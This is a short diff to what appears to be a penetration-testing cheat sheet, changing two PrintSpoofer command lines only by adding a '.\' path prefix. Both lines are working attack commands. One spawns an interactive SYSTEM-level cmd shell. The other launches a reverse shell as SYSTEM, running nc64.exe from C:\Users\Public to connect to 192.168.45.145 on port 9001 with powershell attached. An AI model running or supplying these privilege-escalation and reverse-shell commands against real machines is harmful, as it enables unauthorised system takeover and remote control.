@@ -66,9 +66,9 @@ PrintSpoofer
 ```
 https://github.com/itm4n/PrintSpoofer/releases
 # Usage 1 - Spawning cmd interactive as system
-PrintSpoofer64.exe -i -c cmd
+.\PrintSpoofer64.exe -i -c cmd
 # Usage 2 - Launching reverse shell as system
-PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershell"
+.\PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershell"
 ```
 
 NC
